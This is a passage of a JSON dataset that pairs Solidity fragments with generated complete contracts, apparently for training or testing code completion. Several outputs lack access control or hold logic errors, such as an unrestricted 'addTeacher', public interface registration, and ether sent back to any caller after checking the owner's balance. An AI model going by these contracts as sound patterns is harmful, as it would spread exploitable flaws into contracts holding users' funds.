        "output": "pragma solidity ^0.8.9;\ncontract InterfaceRegistry {\n    mapping(bytes4 => bool) private _supportedInterfaces;\n\n    function supportsInterface(bytes4 interfaceId) public view returns(bool) {\n        return _supportedInterfaces[interfaceId];\n    }\n\n    function registerInterface(bytes4 interfaceId) public {\n        _supportedInterfaces[interfaceId] = true;\n    }\n\n    function unregisterInterface(bytes4 interfaceId) public {\n        _supportedInterfaces[interfaceId] = false;\n    }\n}\n\n",
        "changed": 0
    },
    "521.sol": {
        "input": "pragma solidity 0.7.5;\n\ncontract Dogs {\n\n    struct Person{\n        uint age;\n        string name;\n    }\n\n    Person[] people;\n\n    function addNewPerson(uint _age, string memory _name)public {\n        Person memory newPerson = Person(_age, _name);\n        people.push(newPerson);\n    }\n\n    function getPerson(uint _index)public view returns(uint, string memory){\n        Person memory personToReturn = people[_index];\n        return(personToReturn.age, personToReturn.name);\n    }\n\n    function update(uint _index, uint _newAge, string memory _newName) public returns(uint, string memory) {\n        Person memory updatePerson = people[_index];\n        updatePerson.age = _newAge;\n        updatePerson.name = _newName;\n        people[_index] = updatePerson;\n        return(updatePerson.age, updatePerson.name);\n    }\n    \n    function destory(uint _index) public {\n        delete people[_index];\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity 0.7.5;\n\ncontract Dogs {\n\n    struct Person{\n        uint age;\n        string name;\n    }\n\n    Person[] people;\n\n    function addNewPerson(uint _age, string memory _name)public {\n        Person memory newPerson = Person(_age, _name);\n        people.push(newPerson);\n    }\n\n    function getPerson(uint _index)public view returns(uint, string memory){\n        Person memory personToReturn = people[_index];\n        return(personToReturn.age, personToReturn.name);\n    }\n\n    // to replace and old person with a knew person\n    function update(uint _index, uint _newAge, string memory _newName) public returns(uint, string memory) {\n        Person memory updatePerson = people[_index];\n        updatePerson.age = _newAge;\n        updatePerson.name = _newName;\n        // You can replace the old person at specific index to a new person.\n        // You can do it, using the statement declared below this line  \n        people[_index] = updatePerson;\n        return(updatePerson.age, updatePerson.name);\n    }\n    \n    // delete button for indexs\n    function destory(uint _index) public {\n        delete people[_index];\n    }\n}\n\n",
        "changed": 0
    },
    "523.sol": {
        "input": "import \"../node_modules/hardhat/console.sol\";\n\nimport \"hardhat/console.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    string public greeting;\n\n    constructor(string memory _greeting) {\n        greeting = _greeting;\n    }\n\n    function setGreeting(string memory _greeting) public {\n        greeting = _greeting;\n    }\n\n    function greet() public view returns (string memory) {\n        return greeting;\n    }\n}\n\n",
        "changed": 0
    },
    "524.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Ballot {\n    struct Candidate {\n        address _address;\n        uint256 _noOfVotes;\n    }\n\n    address private chairperson;\n    Candidate[] public candidateList;\n    mapping(address => bool) private isInVoterList;\n    mapping(address => address) private voterToCandidate;\n\n    modifier isOwner() {\n        require(msg.sender == chairperson);\n        _;\n    }\n\n    modifier isVoter(address voterAddress_) {\n        require(\n            voterAddress_ == msg.sender,\n            \"The voter must register by itself...\"\n        );\n        _;\n    }\n\n    modifier voterRules() {\n        require(msg.sender != chairperson, \"Chairperson cannot vote!!\");\n        require(isInVoterList[msg.sender], \"You must register yourself first\");\n        for (uint256 k = 0; k < candidateList.length; k++) {\n            require(\n                voterToCandidate[msg.sender] != candidateList[k]._address,\n                \"You cannot vote twice...\"\n            );\n        }\n\n        _;\n    }\n\n    constructor() {\n        chairperson = msg.sender;\n    }\n\n    function addCandidate(address address_) public isOwner {\n        for (uint256 i = 0; i < candidateList.length; i++) {\n            require(\n                address_ != candidateList[i]._address,\n                \"Same Candidate cannot be added twice\"\n            );\n        }\n        Candidate memory candidate = Candidate(address_, 0);\n        candidateList.push(candidate);\n    }\n\n    function registerVoter(address voterAddress_)\n        external\n        isVoter(voterAddress_)\n    {\n        require(\n            isInVoterList[voterAddress_] == false,\n            \"You are already registerd voter\"\n        );\n        isInVoterList[voterAddress_] = true;\n    }\n\n    function vote(uint256 _candId) public voterRules {\n        voterToCandidate[msg.sender] = candidateList[_candId]._address;\n        candidateList[_candId]._noOfVotes++;\n    }\n}\n\n\n",
        "output": "//SPDX-License-Identifier:UNLICENSED\npragma solidity ^0.8.0;\n\ncontract Ballot {\n    struct Candidate {\n        // string _name;\n        address _address;\n        uint256 _noOfVotes;\n    }\n\n    address private chairperson;\n    Candidate[] public candidateList;\n    mapping(address => bool) private isInVoterList;\n    mapping(address => address) private voterToCandidate;\n\n    modifier isOwner() {\n        require(msg.sender == chairperson);\n        _;\n    }\n\n    modifier isVoter(address voterAddress_) {\n        require(\n            voterAddress_ == msg.sender,\n            \"The voter must register by itself...\"\n        );\n        _;\n    }\n\n    modifier voterRules() {\n        require(msg.sender != chairperson, \"Chairperson cannot vote!!\");\n        require(isInVoterList[msg.sender], \"You must register yourself first\");\n        for (uint256 k = 0; k < candidateList.length; k++) {\n            require(\n                voterToCandidate[msg.sender] != candidateList[k]._address,\n                \"You cannot vote twice...\"\n            );\n        }\n\n        _;\n    }\n\n    constructor() {\n        chairperson = msg.sender;\n    }\n\n    function addCandidate(address address_) public isOwner {\n        for (uint256 i = 0; i < candidateList.length; i++) {\n            require(\n                address_ != candidateList[i]._address,\n                \"Same Candidate cannot be added twice\"\n            );\n        }\n        Candidate memory candidate = Candidate(address_, 0);\n        candidateList.push(candidate);\n    }\n\n    function registerVoter(address voterAddress_)\n        external\n        isVoter(voterAddress_)\n    {\n        require(\n            isInVoterList[voterAddress_] == false,\n            \"You are already registerd voter\"\n        );\n        isInVoterList[voterAddress_] = true;\n    }\n\n    function vote(uint256 _candId) public voterRules {\n        voterToCandidate[msg.sender] = candidateList[_candId]._address;\n        candidateList[_candId]._noOfVotes++;\n    }\n}\n\n",
        "changed": 0
    },
    "525.sol": {
        "input": "constructor(address initialOwner) Ownable(initialOwner) ERC20(_tokenname, _tokensymbol) {\n_owner = initialOwner;\n\nconstructor(address _themergeraddress, address _initialOwner) AssetAcquisition(_initialOwner) {\nthemergeraddress = _themergeraddress;\n\n\n",
        "output": "",
        "changed": 0
    },
    "526.sol": {
        "input": "    fallback() external payable {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event Received(address, uint);\n    address payable public owner;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    fallback() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n    function withdraw() public {\n        require(owner == msg.sender, \"Only the contract owner can withdraw\");\n        owner.transfer(address(this).balance);\n    }\n}\n\n",
        "changed": 0
    },
    "527.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract TicketBooking {\n    \n    struct Event {\n        string name;\n        string description;\n        uint256 startDate;\n        uint256 endDate;\n        uint256 totalTickets;\n        uint256 price;\n        mapping (uint256 => bool) tickets;\n    }\n    \n    Event[] public events;\n    mapping (uint256 => Event) public eventMapping;\n    \n    address payable public admin;\n    \n    constructor() {\n        admin = payable(msg.sender);\n    }\n    \n    function getEvent(uint256 _id) public view returns (string memory, string memory, uint256, uint256, uint256, uint256, uint256) {\n        Event storage selectedEvent = eventMapping[_id];\n        uint256 availableTickets = selectedEvent.totalTickets;\n        for (uint256 i = 0; i < selectedEvent.totalTickets; i++) {\n            if (selectedEvent.tickets[i]) {\n                availableTickets--;\n            }\n        }\n        return (selectedEvent.name, selectedEvent.description, selectedEvent.startDate, selectedEvent.endDate, selectedEvent.totalTickets, availableTickets, selectedEvent.price);\n    }\n}\n\nEvent[] public events;\n    mapping (uint256 => Event) public eventMapping;\n\n\n",
        "output": "",
        "changed": 0
    },
    "528.sol": {
        "input": "payable(msg.sender).transfer(etherToSendBack);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable public owner;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function sendEther() public payable {\n        require(msg.value > 0, \"You need to send some Ether\");\n    }\n\n    function sendBackEther(uint etherToSendBack) public {\n        require(owner.balance >= etherToSendBack, \"Not enough Ether to send back\");\n        payable(msg.sender).transfer(etherToSendBack);\n    }\n\n    receive() external payable {}\n}\n\n",
        "changed": 0
    },
    "529.sol": {
        "input": "compilers: {\n  solc: {\n    version: '0.8.4',\n  },\n},\n\n  networks: {\n    development: {\n...\n    },\n  },\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string public message;\n\n    constructor(string memory initialMessage) {\n        message = initialMessage;\n    }\n\n    function setMessage(string memory newMessage) public {\n        message = newMessage;\n    }\n}\n\n",
        "changed": 0
    },
    "531.sol": {
        "input": "function plus(uint _num, string memory _name) public {  \nperson.push(people(_num, _name));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct people {\n        uint num;\n        string name;\n    }\n\n    people[] public person;\n\n    function plus(uint _num, string memory _name) public {\n        person.push(people(_num, _name));\n    }\n}\n\n",
        "changed": 0
    },
    "533.sol": {
        "input": "function expand(uint256 randomValue, uint256 n) public pure returns (uint256[] memory expandedValues) {\n    expandedValues = new uint256[](n);\n    for (uint256 i = 0; i < n; i++) {\n        expandedValues[i] = uint256(keccak256(abi.encode(randomValue, i)));\n    }\n    return expandedValues;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ExpandContract {\n    function expand(uint256 randomValue, uint256 n) public pure returns (uint256[] memory expandedValues) {\n        expandedValues = new uint256[](n);\n        for (uint256 i = 0; i < n; i++) {\n            expandedValues[i] = uint256(keccak256(abi.encode(randomValue, i)));\n        }\n        return expandedValues;\n    }\n}\n\n",
        "changed": 0
    },
    "534.sol": {
        "input": "function INITIAL_SUPPLY() public pure returns(uint256) { return 10000 * (10 ** 18) }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleToken {\n    string public constant name = \"SimpleToken\";\n    string public constant symbol = \"SIM\";\n    uint8 public constant decimals = 18;\n\n    // Declare a uint256 type variable 'totalSupply'\n    uint256 public totalSupply;\n\n    // Balances for each account\n    mapping(address => uint256) balances;\n\n    // Event that gets triggered when value is transferred\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n    // Constructor\n    constructor() public {\n        totalSupply = INITIAL_SUPPLY();\n        balances[msg.sender] = totalSupply;  // Give the creator all initial tokens\n    }\n\n    // Function that returns the total supply of tokens\n    function INITIAL_SUPPLY() public pure returns(uint256) { \n        return 10000 * (10 ** uint256(decimals)); \n    }\n\n    // Function to transfer tokens\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balances[msg.sender] >= _value);\n        balances[msg.sender] -= _value;           // deduct from sender's balance\n        balances[_to] += _value;                  // add to recipient's balance\n        emit Transfer(msg.sender, _to, _value);   // emit Transfer event\n        return true;\n    }\n\n    // Function to get balance of a certain address\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n}\n\n",
        "changed": 1
    },
    "535.sol": {
        "input": "function addKhatianFromOld(uint64 _khatianiId, bytes32 _plotHash, uint16 _percentOwn, bytes32 _buyFrom, uint[] memory _user, uint16[] memory _percentage) public{\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract KhatianContract {\n    struct Khatian {\n        uint64 khatianiId;\n        bytes32 plotHash;\n        uint16 percentOwn;\n        bytes32 buyFrom;\n        uint[] user;\n        uint16[] percentage;\n    }\n\n    mapping(uint64 => Khatian) public khatians;\n\n    function addKhatianFromOld(\n        uint64 _khatianiId,\n        bytes32 _plotHash,\n        uint16 _percentOwn,\n        bytes32 _buyFrom,\n        uint[] memory _user,\n        uint16[] memory _percentage\n    ) public {\n        require(_user.length == _percentage.length, \"User and percentage arrays must have the same length\");\n        Khatian storage k = khatians[_khatianiId];\n        k.khatianiId = _khatianiId;\n        k.plotHash = _plotHash;\n        k.percentOwn = _percentOwn;\n        k.buyFrom = _buyFrom;\n        k.user = _user;\n        k.percentage = _percentage;\n    }\n\n    function getKhatian(uint64 _khatianiId) public view returns (uint64, bytes32, uint16, bytes32, uint[] memory, uint16[] memory) {\n        Khatian memory k = khatians[_khatianiId];\n        return (k.khatianiId, k.plotHash, k.percentOwn, k.buyFrom, k.user, k.percentage);\n    }\n}\n\n",
        "changed": 0
    },
    "536.sol": {
        "input": "assert(true && true);\n\nuint8 three = 3;                \nuint8 five = 5;                 \nuint8 result = three & five;    \n\nassert (students[studentHash] && subjects[subjectHash] && teachers[msg.sender]);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract EducationContract {\n    mapping(address => bool) public teachers;\n    mapping(bytes32 => bool) public students;\n    mapping(bytes32 => bool) public subjects;\n    \n    function validate(uint8 _three, uint8 _five, bytes32 studentHash, bytes32 subjectHash) public {\n        require(teachers[msg.sender], \"Only teachers can perform this operation\");\n        \n        assert(true && true);\n        \n        uint8 three = _three;                \n        uint8 five = _five;                 \n        uint8 result = three & five;    \n        \n        assert (students[studentHash] && subjects[subjectHash]);\n    }\n    \n    function addTeacher(address _teacher) public {\n        teachers[_teacher] = true;\n    }\n    \n    function addStudent(bytes32 _studentHash) public {\n        students[_studentHash] = true;\n    }\n    \n    function addSubject(bytes32 _subjectHash) public {\n        subjects[_subjectHash] = true;\n    }\n}\n\n",
        "changed": 0
    },
    "537.sol": {
        "input": "constructor() {\n    initialize();\n}\n\nfunction initialize() initializer public {\n\n\n",
        "output": "",
        "changed": 0
    },
    "538.sol": {
        "input": "  ...\n\n  await timeLockContract.grant( \n    await timeLockContract.TIMELOCK_ADMIN_ROLE(), \n    roleMultiCall.address);\n\n  const multiCallResult = await roleMultiCall.multiCall(\n    targets,\n    encodedFunctions,\n  );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimeLockContract {\n    address public admin;\n    address public roleMultiCall;\n  \n    mapping(address => bool) public admins;\n  \n    constructor(address _roleMultiCall) public {\n        admin = msg.sender;\n        roleMultiCall = _roleMultiCall;\n    }\n  \n    modifier onlyAdmin() {\n        require(msg.sender == admin, \"Only admin can call this function\");\n        _;\n    }\n  \n    function grant(address _roleMultiCall) public onlyAdmin {\n        roleMultiCall = _roleMultiCall;\n    }\n  \n    function multiCall(address[] memory targets, bytes[] memory encodedFunctions) public {\n        require(msg.sender == roleMultiCall, \"Only roleMultiCall can call this function\");\n        for (uint i = 0; i < targets.length; i++) {\n            (bool success,) = targets[i].call(encodedFunctions[i]);\n            require(success, \"Call failed\");\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "539.sol": {
        "input": "balances[msg.sender] = 0;\n\nmsg.sender.transfer(balances[msg.sender]);\n\nuint256 balance = balances[msg.sender];\nbalances[msg.sender] = 0; \nmsg.sender.transfer(balance); \n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        require(msg.value > 0);\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        uint256 balance = balances[msg.sender];\n        require(balance > 0);\n        balances[msg.sender] = 0;\n        msg.sender.transfer(balance);\n    }\n\n    function getBalance() public view returns (uint256) {\n        return balances[msg.sender];\n    }\n}\n\n",
        "changed": 0
    },
    "540.sol": {
        "input": "function claimFreeToken() public payable {\n    _transfer(address(this), msg.sender, 1000 * (10**decimals()));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n    mapping (address => uint256) public balanceOf;\n    uint256 public decimals = 18;\n\n    constructor() public {\n        balanceOf[address(this)] = 1000000000 * (10**decimals);\n    }\n\n    function _transfer(address _from, address _to, uint256 _value) internal {\n        require(balanceOf[_from] >= _value);\n        require(balanceOf[_to] + _value >= balanceOf[_to]);\n\n        uint previousBalances = balanceOf[_from] + balanceOf[_to];\n\n        balanceOf[_from] -= _value;\n        balanceOf[_to] += _value;\n\n        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n    }\n\n    function claimFreeToken() public payable {\n        _transfer(address(this), msg.sender, 1000 * (10**decimals));\n    }\n}\n\n",
        "changed": 1
    },
    "541.sol": {
        "input": "function reverseArray(uint[] calldata _array) public pure returns(uint[] memory) {\n    uint length = _array.length;\n    uint[] memory reversedArray = new uint[](length);\n    uint j = 0;\n    for(uint i = length; i >= 1; i--) {\n        reversedArray[j] = _array[i-1];\n        j++;\n    }\n    return reversedArray;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ArrayReverser {\n    function reverseArray(uint[] calldata _array) public pure returns(uint[] memory) {\n        uint length = _array.length;\n        uint[] memory reversedArray = new uint[](length);\n        uint j = 0;\n        for(uint i = length; i >= 1; i--) {\n            reversedArray[j] = _array[i-1];\n            j++;\n        }\n        return reversedArray;\n    }\n}\n\n",
        "changed": 0
    },
    "542.sol": {
        "input": "function vote(uint _entrociterID) public {\n    require(votes[msg.sender] <MAX_VOTES_PER_VOTER, \"Voter has no votes left.\"); \n    require(_entrociterID > 0 && _entrociterID <= entrociterCount, \" Entrociter ID is out of range.\");\n\n    votes[msg.sender]++; \n    Entrociter storage entrociter=entrociters[_entrociterID]; \n    entrociter.votes++;\n    entrociters[entrociterCount] = entrociter;\n    emit Voted(); }\n\n    function addEntrociter(string memory _name, string memory _party) public {\n    entrociterCount++;\n\n    Entrociter memory entrociter = Entrociter(entrociterCount, _name, _party, 0);\n    entrociters[entrociterCount] = entrociter;\n\n    emit NewEntrociter();\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Voting {\n    struct Entrociter {\n        uint id;\n        string name;\n        string party;\n        uint votes;\n    }\n\n    mapping(address => uint) public votes;\n    mapping(uint => Entrociter) public entrociters;\n    uint public entrociterCount;\n    uint constant MAX_VOTES_PER_VOTER = 10;\n\n    event Voted();\n    event NewEntrociter();\n\n    constructor() public {\n        entrociterCount = 0;\n    }\n\n    function vote(uint _entrociterID) public {\n        require(votes[msg.sender] < MAX_VOTES_PER_VOTER, \"Voter has no votes left.\"); \n        require(_entrociterID > 0 && _entrociterID <= entrociterCount, \" Entrociter ID is out of range.\");\n\n        votes[msg.sender]++; \n        Entrociter storage entrociter = entrociters[_entrociterID]; \n        entrociter.votes++;\n        entrociters[_entrociterID] = entrociter;\n        emit Voted();\n    }\n\n    function addEntrociter(string memory _name, string memory _party) public {\n        entrociterCount++;\n\n        Entrociter memory entrociter = Entrociter(entrociterCount, _name, _party, 0);\n        entrociters[entrociterCount] = entrociter;\n\n        emit NewEntrociter();\n    }\n}\n\n",
        "changed": 0
    },
    "543.sol": {
        "input": "function foo() public {\n    try this.transfer(address(0x123), 2) {\n    } catch (bytes memory data) {\n    }\n}\n\nfunction foo() public {\n    try this.transfer(address(0x123), 2) {\n    } catch Error (string memory reason) {\n    }\n}\n\nrequire(balance[msg.sender]<amount, \"Insufficient Balance\");\n\nrequire(balance[msg.sender] => amount, \"Insufficient Balance\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping(address => uint256) public balance;\n\n    constructor() {\n        balance[msg.sender] = 10000; // Initial supply\n    }\n    \n    function foo() public {\n        try this.transfer(address(0x123), 2) {\n        } catch (bytes memory data) {\n        }\n    }\n    \n    function transfer(address to, uint256 amount) public returns (bool) {\n        require(balance[msg.sender] >= amount, \"Insufficient Balance\");\n        balance[msg.sender] -= amount;\n        balance[to] += amount;\n        return true;\n    }\n    \n    function checkBalance(address account) public view returns (uint256) {\n        return balance[account];\n    }\n}\n\n",
        "changed": 1
    },
    "545.sol": {
        "input": "function stake() public payable () {\n\nfunction stake() public payable {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StakingContract {\n    mapping(address => uint256) public balances;\n\n    event Staked(address indexed user, uint256 amount);\n\n    function stake() public payable {\n        require(msg.value > 0, \"Stake amount must be greater than 0\");\n\n        balances[msg.sender] += msg.value;\n\n        emit Staked(msg.sender, msg.value);\n    }\n\n    function getBalance() public view returns (uint256) {\n        return balances[msg.sender];\n    }\n}\n\n",
        "changed": 0
    },
    "546.sol": {
        "input": "function greet()public view returns (string memory)\n\n   var Greeter = artifacts.require(\"./Greeter.sol\")\n\n var Greeter = artifacts.require(\"Greeter\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Greeter {\n    string public greeting;\n\n    constructor() public {\n        greeting = 'Hello';\n    }\n\n    function setGreeting(string memory _greeting) public {\n        greeting = _greeting;\n    }\n\n    function greet() public view returns (string memory) {\n        return greeting;\n    }\n}\n\n",
        "changed": 0
    },
    "547.sol": {
        "input": "function stake (uint256 _amount) public {\n     ...\n     ercToken.transfer(address(ercToken), _amount);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract StakingContract {\n    IERC20 public ercToken;\n    mapping(address => uint256) public stakingBalance;\n    mapping(address => bool) public hasStaked;\n    mapping(address => bool) public isStaking;\n\n    event Stake(address indexed user, uint _amount);\n\n    constructor(IERC20 _ercToken) public {\n        ercToken = _ercToken;\n    }\n\n    function stake(uint256 _amount) public {\n        require(_amount > 0, \"Amount cannot be 0\");\n        require(ercToken.balanceOf(msg.sender) >= _amount, \"Not enough tokens for staking\");\n\n        ercToken.transferFrom(msg.sender, address(this), _amount);\n        stakingBalance[msg.sender] = stakingBalance[msg.sender] + _amount;\n\n        if(!hasStaked[msg.sender]) {\n            hasStaked[msg.sender] = true;\n        }\n\n        isStaking[msg.sender] = true;\n        emit Stake(msg.sender, _amount);\n    }\n}\n\n",
        "changed": 1
    },
    "548.sol": {
        "input": "const firstStage = await contractWithSigner.callStatic.firstStage(signer.getAddress());\n\ncontract Test {\n    event FirstStage(uint256, uint256, string memory);\n\n    function firstStage(address addr) public returns(uint256, uint256, string memory) {\n\n         emit FirstStage(challenge, Mnode, toHex(Hnode));\n         return (challenge, Mnode, toHex(Hnode));\n     }\n}\n\nconst transaction = await contractWithSigner.firstStage(signer.getAddress());\nconst txReceipt = await transaction.wait();\nconst eventLogs = txReceipt.events;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    event FirstStage(uint256 challenge, uint256 Mnode, string Hnode);\n\n    function firstStage(address addr) public returns(uint256, uint256, string memory) {\n        uint256 challenge = 1;  // Replace with your own logic\n        uint256 Mnode = 2;  // Replace with your own logic\n        string memory Hnode = \"test\";  // Replace with your own logic\n\n        emit FirstStage(challenge, Mnode, Hnode);\n        return (challenge, Mnode, Hnode);\n    }\n}\n\n",
        "changed": 0
    },
    "549.sol": {
        "input": "IERC721 public nftOne;\nuint public nftTwoMaxMintCount;\nmapping(uint => uint) public nftTwoMints;\n\nfunction mintNftTwo(uint nftOneTokenId) external {\n\n    require(msg.sender == nftOne.ownerOf(nftOneTokenId), \"not the owner of nftOne token\");\n\n    require(nftTwoMints[nftOneTokenId] <= nftTwoMaxMintCount, \"nftTwo token mints overflow\");\n\n    nftTwoMints[nftOneTokenId] += 1;\n\n    _mintNftTwo(); \n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "550.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol\";\n\ncontract MyCollection is ERC721Enumerable, ERC721Burnable {\n    constructor() ERC721(\"CollectionName\", \"Symbol\") {\n        _mint(msg.sender, 1);\n        _burn(1);\n        _mint(msg.sender, 2);\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal override(ERC721, ERC721Enumerable) {\n        return ERC721Enumerable._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function supportsInterface(bytes4 interfaceId) public view override(ERC721, ERC721Enumerable) returns (bool) {\n        return ERC721Enumerable.supportsInterface(interfaceId);\n    }\n}\n\npragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol\";\n\ncontract MyCollection is ERC721Enumerable, ERC721Burnable {\n    uint256 public mintCounter;\n\n    constructor() ERC721(\"CollectionName\", \"Symbol\") {\n        _mint(msg.sender, 1);\n        _burn(1);\n        _mint(msg.sender, 2);\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal override(ERC721, ERC721Enumerable) {\n        if (from == address(0)) {\n            mintCounter++;\n        }\n\n        return ERC721Enumerable._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function supportsInterface(bytes4 interfaceId) public view override(ERC721, ERC721Enumerable) returns (bool) {\n        return ERC721Enumerable.supportsInterface(interfaceId);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "551.sol": {
        "input": "_mint(to, tokenId, amount, \"\");\n\n\n",
        "output": "",
        "changed": 0
    },
    "552.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract MyContract {\n    uint256 public myVariable;\n\n    function setVariable(uint256 _myVariable) public {\n        myVariable = _myVariable;\n    }\n\n    function getVariable() public view returns (uint256) {\n        return myVariable;\n    }\n}\n\ntruffle compile\n\ntruffle migrate --network name_of_your_network\n\nconst myContractJSON = require(\"./build/contracts/MyContract.json\");\nconst myContractABI = myContractJSON.abi;\nconst myContractAddress = \"0x...\"; \nconst myContract = new web3.eth.Contract(myContractABI, myContractAddress);\n\nconst Web3 = require(\"web3\");\nconst web3 = new Web3(new Web3.providers.HttpProvider(\"http:\n\n\nmyContract.methods.getVariable().call().then(console.log);\n\nconst accounts = await web3.eth.getAccounts();\n\nmyContract.methods.setVariable(5).send({ from: accounts[0] })\n  .then(receipt => console.log(receipt));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public myVariable;\n\n    function setVariable(uint256 _myVariable) public {\n        myVariable = _myVariable;\n    }\n\n    function getVariable() public view returns (uint256) {\n        return myVariable;\n    }\n}\n\n",
        "changed": 0
    },
    "554.sol": {
        "input": "YourTokenStruct[] public yourTokens;\n\nstruct YourTokenStruct {\n    string name;\n    uint256 id;\n}\n\nfunction mint(string memory name, uint256 id) public payable returns(uint256){\n    require(msg.value == 1 ether);\n    require(id > 0);\n    \n    uint _tokenId = yourTokens.push(YourTokenStruct(name, id)) - 1;\n\n    _mint(msg.sender, _tokenId);\n\n    return _tokenId;\n}\n\nfunction withdraw() payable external ifOwner {\n    msg.sender.transfer(address(this).balance);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "557.sol": {
        "input": "bool sent = payable(address(this)).send(msg.value);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event PaymentReceived(address from, uint256 amount);\n\n    function receivePayment() public payable {\n        require(msg.value > 0, \"Payment must be positive\");\n        bool sent = payable(address(this)).send(msg.value);\n        \n        require(sent, \"Failed to receive payment\");\n        emit PaymentReceived(msg.sender, msg.value);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 1
    },
    "558.sol": {
        "input": "pragma solidity >=0.8.0;\n\ncontract MappingsC {\n    struct Item {\n        uint groupId;\n        uint itemId;\n    }\n    \n    mapping(uint => Item[]) private items;\n    \n    function setItem(uint groupId, uint itemId) public {\n        items[groupId].push(Item(groupId, itemId));\n    }\n\n    function getItem(uint groupId, uint itemId) public view returns (Item memory) {\n        return items[groupId][itemId];\n    }\n    \n    function getItems(uint groupId) public view returns (Item[] memory) {\n        return items[groupId];\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\ncontract MappingsC {\n    struct Item {\n        uint groupId;\n        uint itemId;\n    }\n    \n    mapping(uint => Item[]) private items;\n    \n    function setItem(uint groupId, uint itemId) public {\n        items[groupId].push(Item(groupId, itemId));\n    }\n\n    function getItem(uint groupId, uint itemId) public view returns (Item memory) {\n        return items[groupId][itemId];\n    }\n    \n    function getItems(uint groupId) public view returns (Item[] memory) {\n        return items[groupId];\n    }\n}\n\n",
        "changed": 0
    },
    "559.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo(string[] memory _arg) external {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo(string[] memory _arg) external {\n    }\n}\n\n",
        "changed": 0
    },
    "560.sol": {
        "input": "       pragma solidity >0.5.0;\n           contract Greeter {\n                string public greeting;\n                constructor() public {\n                    greeting = 'Hello';\n                }\n                function setGreeting(string memory _greeting) public {\n                    greeting = _greeting;\n                }\n                function greet() view public returns (string memory) {\n                    return greeting;\n                }\n         }\n\n    from brownie import accounts, Greeter\n    \n    def interactions():\n        account = accounts[0]\n        contractObj = Greeter.deploy({\"from\": account})\n        transaction = contractObj.setGreeting(Hola, {\"from\": account})\n        transaction.wait(1)\n        updatedGreeter = contractObj.greet()\n        print(updatedGreeter)\n    \n    def main()\n        interactions()\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Greeter {\n    string public greeting;\n\n    constructor() public {\n        greeting = 'Hello';\n    }\n\n    function setGreeting(string memory _greeting) public {\n        greeting = _greeting;\n    }\n\n    function greet() view public returns (string memory) {\n        return greeting;\n    }\n}\n\n",
        "changed": 0
    },
    "561.sol": {
